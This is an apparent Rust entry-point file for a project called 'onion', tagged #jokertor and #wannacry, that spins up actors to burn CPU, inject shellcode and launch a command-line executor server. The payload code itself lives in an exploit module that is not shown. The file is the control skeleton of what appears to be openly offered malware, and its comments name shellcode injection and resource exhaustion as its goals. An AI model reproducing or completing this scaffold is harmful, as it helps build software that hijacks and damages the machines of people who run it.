





/*
                
                                
 ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░ ░           ░  ░      ░ ░           ░ 
                                         

#jokertor
#wannacry


*/




pub mod utils;
pub mod exploit;
pub mod constants;
pub mod scheduler;
use std::time::Duration;
use std::io::{Read, Write}; //// based on orphan rule these traits must be imported to call the read() and write() methods on the incoming stream since the Read and Write traits have been implemented for the TcpStream structure thus we can read from and write into the incoming stream
use std::net::{TcpListener, TcpStream, Shutdown};
use riker::actors::*;
use std::mem;
use constants::*;
use uuid::Uuid;
use borsh::{BorshDeserialize, BorshSerialize}; //// loading borsh tratis 
use std::env;
use dotenv::dotenv;








fn main(){



    // utils::trash();
    // utils::mactrait();
    // utils::unsafer();







    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
    //               onion system
    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈

    dotenv().expect(".env file not found");

    //// onion_actors vector contains references to all Cry actors with the mailbox of type Msg
    //// also we're naming the exploits::Cry struct as the Actor
    let mut onion_actors = Vec::<ActorRef<<exploit::Cry as Actor>::Msg>>::new();
    let onion_sys = SystemBuilder::new()
                                                .name("onion")
                                                .create()
                                                .unwrap(); //// unwrapping the last functional method




    
    



    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
    //             building actors
    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
    
    //// when an actor is created, it gets its own mailbox for receiving messages and other interested actors are notified about the new actor joining the system
    //// ActorRef is a lightweight type that is inexpensive to clone and can be used to interact with its underlying Actor, such as sending messages to it also is a reference to the actor
    //// ActorRef always refers to a specific instance of an actor, when two instances of the same Actor are started, they're still considered separate actors, each with different ActorRefs
    //// ActorRef are inexpensive and can be cloned alos they can be sent as a message to another actor
    
    //// initializing the first burn actor; ActorRef is of type Cmd means that we can communicate with another actor or the actor itself by sending Cmd messages
    let burn_actor_0 = onion_sys.actor_of::<exploit::Cry>("burn-0").unwrap(); 
    onion_actors.push(burn_actor_0.clone());
    
    //// initializing inject actor; ActorRef is of type Cmd means that we can communicate with another actor or the actor itself by sending Cmd messages
    let inject_actor = onion_sys.actor_of::<exploit::Cry>("inject-1").unwrap(); 
    onion_actors.push(inject_actor.clone());
    
    //// initializing cli executor app actor; ActorRef is of type Cmd means that we can communicate with another actor or the actor itself by sending Cmd messages
    let cea_actor = onion_sys.actor_of::<exploit::Cry>("cli-executor-app-2").unwrap();
    onion_actors.push(cea_actor.clone());




    
    

    


    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈
    //          calling between actors
    // ⚈ --------- ⚈ --------- ⚈ --------- ⚈

    //// telling to another actor or the actor itself that hey start burning cpu please
    //// since we're sending the message from main to the burn_actor_0 actor and not from an actor, we're setting the sender as None
    burn_actor_0.tell(exploit::Cmd::BurnCpu.try_to_vec().unwrap(), None);
    
    //// telling to another actor or the actor itself that hey inject the shellcode please
    //// since we're sending the message from main to the inject_actor actor and not from an actor, we're setting the sender as None
    inject_actor.tell(exploit::Cmd::Inject.try_to_vec().unwrap(), None);

    //// telling to another actor or the actor itself that hey start the cli executor app server
    //// since we're sending the message from main to the cea_actor actor and not from an actor, we're setting the sender as None
    cea_actor.tell(exploit::Cmd::Cea.try_to_vec().unwrap(), None);






}
